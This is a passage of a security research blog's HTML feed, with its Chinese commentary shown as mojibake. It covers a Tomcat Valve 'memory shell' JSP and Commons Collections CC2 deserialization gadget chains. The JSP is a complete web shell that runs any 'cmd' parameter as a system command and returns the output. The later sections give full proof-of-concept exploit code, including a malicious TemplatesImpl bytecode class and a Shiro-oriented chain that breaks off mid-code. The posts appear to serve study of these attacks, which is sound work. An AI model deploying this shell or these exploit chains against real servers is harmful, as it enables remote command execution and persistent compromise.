class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">this</span>.getNext().invoke(request, response);</span><br></pre></td></tr></table></figure><p>å®Œæ•´ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//valveTrojan.jsp</span></span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.valves.ValveBase&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Request</span> <span class="variable">request1</span> <span class="operator">=</span> (Request) requestField.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) request1.getContext();</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">pipelineField</span> <span class="operator">=</span> ContainerBase.class.getDeclaredField(<span class="string">&quot;pipeline&quot;</span>);</span><br><span class="line">    pipelineField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardPipeline</span> <span class="variable">standardPipeline1</span> <span class="operator">=</span> (StandardPipeline) pipelineField.get(standardContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">ValveBase</span> <span class="variable">valveBase</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ValveBase</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> ServletException,IOException &#123;</span><br><span class="line">            <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    isLinux = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                response.getWriter().write(output);</span><br><span class="line">                response.getWriter().flush();</span><br><span class="line">                <span class="built_in">this</span>.getNext().invoke(request, response);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    standardPipeline1.addValve(valveBase);</span><br><span class="line"></span><br><span class="line">    out.println(<span class="string">&quot;evil valve inject done!&quot;</span>);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229130722086.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229130722086.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229131412313.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229131412313.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="others"><a href="#others" class="headerlink" title="others"></a>others</h2><p>è‡³äºä¸ºä»€ä¹ˆè¯´æ˜¯å†…å­˜é©¬ï¼Œæ¯”å¦‚ä¸Šé¢listenerTrojan.jspè®¿é—®ä¸€éåï¼Œæ³¨å†Œäº†listenerã€‚ç„¶åå°±å¯ä»¥æŠŠjspåˆ æ‰äº†ï¼Œå†è®¿é—®ä¸Šä¸‹æ–‡ç¯å¢ƒå°±èƒ½ç›´æ¥å¸¦ä¸Šå‚æ•°å‘½ä»¤æ‰§è¡Œã€‚åªè¦æœåŠ¡å™¨ä¸é‡å¯å°±ä¸€ç›´è¿è¡Œ</p><p>ä¸è¿‡ä¸Šè¿°å†…å­˜é©¬éƒ½ä¸æ˜¯çœŸæ­£æ„ä¹‰ä¸Šçš„å†…å­˜é©¬ï¼Œå®ƒä»¬ä¼šè¾“å‡ºåœ¨tomcatçš„ç›®å½•ä¸‹</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229153959584.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229153959584.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ¯”å¦‚ä¸Šè¿°è¿è¡Œçš„jspï¼Œåœ¨CTALINA_BASEç¯å¢ƒçš„<code>work\Catalina\localhost\Servlet_webç¯å¢ƒ\org\apache\jsp</code>éƒ½æœ‰ç›¸åº”çš„æ–‡ä»¶</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229154145023.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229154145023.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å…³äºçœŸæ­£æ„ä¹‰ä¸Šçš„å†…å­˜é©¬æ³¨å…¥ï¼š<a href="http://wjlshare.com/archives/1541">http://wjlshare.com/archives/1541</a></p><p>å€ŸåŠ©ccé“¾è¿›è¡Œå†…å­˜é©¬æ³¨å…¥</p><p>å‚è€ƒï¼š<a href="http://wjlshare.com/archives/1529">http://wjlshare.com/archives/1529</a></p><p><a href="https://paper.seebug.org/1441/#1_1">https://paper.seebug.org/1441/#1_1</a></p><p>å‚è€ƒäº†Ho1aAsçš„å¤šç¯‡æ–‡ç« ï¼š<a href="https://ho1aas.blog.csdn.net/article/details/124120724">https://ho1aas.blog.csdn.net/article/details/124120724</a></p><p><a href="https://ho1aas.blog.csdn.net/article/details/124120724">https://ho1aas.blog.csdn.net/article/details/124120724</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> å†…å­˜é©¬ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tomcat </tag>
            
            <tag> å†…å­˜é©¬ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ— æ•°ç»„TransformingComparator CC2</title>
      <link href="/2022/10/23/java-priorityqueue/"/>
      <url>/2022/10/23/java-priorityqueue/</url>
      
        <content type="html"><![CDATA[<h1 id="java-PriorityQueue"><a href="#java-PriorityQueue" class="headerlink" title="java_PriorityQueue"></a>java_PriorityQueue</h1><p><code>java.util.PriorityQueue </code>æ˜¯ä¸€ä¸ªä¼˜å…ˆé˜Ÿåˆ—ï¼ˆQueueï¼‰ï¼ŒèŠ‚ç‚¹ä¹‹é—´æŒ‰ç…§ä¼˜å…ˆçº§å¤§å°æ’åºæˆä¸€æ£µæ ‘ã€‚å…¶ä¸­PriorityQueueæœ‰è‡ªå·±çš„readObjectååºåˆ—åŒ–å…¥å£ã€‚</p><p>ååºåˆ—åŒ–é“¾ä¸ºï¼š<code>PriorityQueue#readObject</code>-&gt;<code>heapify()</code>-&gt;<code>siftDown()</code>-&gt;<code>siftDownUsingComparator()</code>-&gt;<code>comparator.compare()</code>ã€‚å½“comparatorä¸ºTransformingComparatorå¯¹è±¡æ—¶ï¼Œèƒ½è§¦å‘transform()æ–¹æ³•ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221206160559047.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221206160559047.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è‡³äºPriorityQueueçš„<code>heapify()ã€siftDown()ã€siftDownUsingComparator()</code>çš„ç”¨å¤„å°±æ˜¯æ¢å¤æ’åºã€èŠ‚ç‚¹ä¸‹ç§»å’Œæ¯”è¾ƒå…ƒç´ å¤§å°ã€‚è€ŒComparatoråˆ™æ˜¯å®šä¹‰äº†ä¸¤ä¸ªå¯¹è±¡ç”¨ä»€ä¹ˆæ–¹å¼æ¯”è¾ƒ</p><h2 id="CC2TransformingComparator"><a href="#CC2TransformingComparator" class="headerlink" title="CC2TransformingComparator"></a>CC2TransformingComparator</h2><p>ç»“åˆCC2çš„åˆ©ç”¨æ–¹å¼ï¼Œå°±æ˜¯å‘TransformingComparatorä¼ å…¥æ¶æ„Transformerã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br></pre></td></tr></table></figure><p>å†ç”¨priorityQueueè§¦å‘comparator:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">queue.add(<span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>å¯ä»¥addä»»ä½•énullå¯¹è±¡ï¼Œå› ä¸ºè§¦å‘transformä¸é˜Ÿåˆ—å‚æ•°æ— å…³ï¼ˆæ¯”è¾ƒçš„æ˜¯1,2ï¼Œæ¯”è¾ƒæ–¹å¼ä¸ºcomparator.compare()ï¼‰</p><ul><li>POCï¼š</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC2TransformingComparator</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object</span></span><br><span class="line"><span class="params">            value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;<span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                        String.class,</span><br><span class="line">                        Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                        Object.class,</span><br><span class="line">                        Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span></span><br><span class="line">                        <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class</span><br><span class="line">                &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;calc.exe&quot;</span> &#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">        <span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">                <span class="title class_">TransformingComparator</span>(transformerChain);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line">        setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æµ‹è¯•ç»“æœï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221206161847500.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221206161847500.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="TemplatesImplæ— æ•°ç»„TransformingComparator"><a href="#TemplatesImplæ— æ•°ç»„TransformingComparator" class="headerlink" title="TemplatesImplæ— æ•°ç»„TransformingComparator"></a>TemplatesImplæ— æ•°ç»„TransformingComparator</h2><p>ç”¨TemplatesImplå­—èŠ‚ç çš„æ–¹å¼ä¹Ÿèƒ½è¿›è¡Œåˆ©ç”¨ï¼Œå¹¶ä¸”è¿˜èƒ½ç”¨äºshiroçš„æ— æ•°ç»„é“¾ï¼š</p><p>åŒæ ·çš„å‘TransformingComparatorä¼ å…¥æ¶æ„Transformerï¼Œè¿™æ¬¡ä¼ çš„æ˜¯InvokerTransformerï¼Œè€ŒétransformerChainæ•°ç»„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer);</span><br></pre></td></tr></table></figure><p>è§¦å‘comparatorçš„æ–¹å¼è¿˜æ˜¯å®ä¾‹åŒ–PriorityQueueå¯¹è±¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">queue.add(obj);</span><br><span class="line">queue.add(obj);</span><br></pre></td></tr></table></figure><p>ä¸ºä»€ä¹ˆè¦ä¼ TemplatesImplçš„å¯¹è±¡objå‘¢ï¼Ÿå›æƒ³åœ¨æ²¡æœ‰ConstantTransformeråˆå§‹åŒ–å¯¹è±¡çš„æƒ…å†µä¸‹ï¼Œshiroååºåˆ—åŒ–æ˜¯ä¾é TiedMapEntryçš„æ„é€ å‡½æ•°æŠŠåˆå§‹åŒ–å¯¹è±¡ä¼ å…¥key</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221206164448132.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221206164448132.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>TiedMapEntryçš„hashcodeè°ƒç”¨äº†getValueï¼ŒgetValueè§¦å‘lazyMap.get()</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221206164623593.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221206164623593.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä½†æ˜¯åœ¨ä½¿ç”¨PriorityQueueç±»æ—¶ï¼Œå°±æ— æ³•ç”¨åˆ°shiroçš„å…¥å£HashMapï¼Œè‡ªç„¶æ•´æ¡é“¾éƒ½ç”¨ä¸äº†ã€‚è¿›å…¥templatesImplå¯¹è±¡çš„newTransformer()å…¥å£çš„æ–¹å¼å˜ä¸º:</p><p><code>PriorityQueue#Compare()</code>-&gt;<code>TransformingComparator#transform</code>-&gt;<code>InvokerTransformer</code>-&gt;<code>TemplatesImpl#newTransformer()</code></p><p>åªéœ€è¦compare()æ—¶å¯¹è±¡ä¸ºæ¶æ„InvokerTransformer</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221206160559047.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221206160559047.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ¶æ„å­—èŠ‚ç ç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> evil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilTemplatesImpl</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilTemplatesImpl</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello TemplatesImpl&quot;</span>);</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>POC:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShiroTransformingComparator</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">static</span> <span class="type">byte</span>[] getBytescode() <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(evil.EvilTemplatesImpl.class.getName());</span><br><span class="line">        <span class="keyword">return</span> clazz.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span 